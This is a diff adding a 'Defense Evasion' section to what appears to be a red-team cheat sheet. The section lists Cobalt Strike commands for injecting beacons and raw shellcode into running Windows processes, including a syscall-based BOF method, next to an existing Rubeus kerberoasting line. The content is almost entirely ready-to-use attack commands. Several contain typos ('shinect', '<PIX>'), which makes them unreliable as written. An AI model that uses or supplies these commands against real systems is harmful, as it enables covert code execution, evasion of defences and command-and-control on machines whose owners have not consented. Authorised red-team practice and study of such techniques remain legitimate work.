@@ -245,6 +245,23 @@ execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccoun
 ```
 
 ------------------------------------------------------------------------------------------
+## Defense Evasion
+
+### Shellcode injection
+Several methods here within Cobalt Strike or using BOFs
+```
+# Spawn a beacon into an existing process
+inject <PID> <x86|x64> HTTPSLISTENER
+
+# Inject raw shellcode into an existing process
+# Create shellcode: Cobbalt Strike --> Attacks --> Packages --> Windows Executable (S) --> Output = Raw --> Creates "beacon.bin" file
+shinect <PID> <x86|x64> C:\beacon.bin
+
+# Shellcode injection using Windows syscalls with [BOF script](https://github.com/ajpc500/BOFs)
+syscalls_shinject <PIX> C:\beacon.bin
+```
+
+------------------------------------------------------------------------------------------
 ## Exploitation
 
 ### DPAPI decryption and extraction on Windows systems
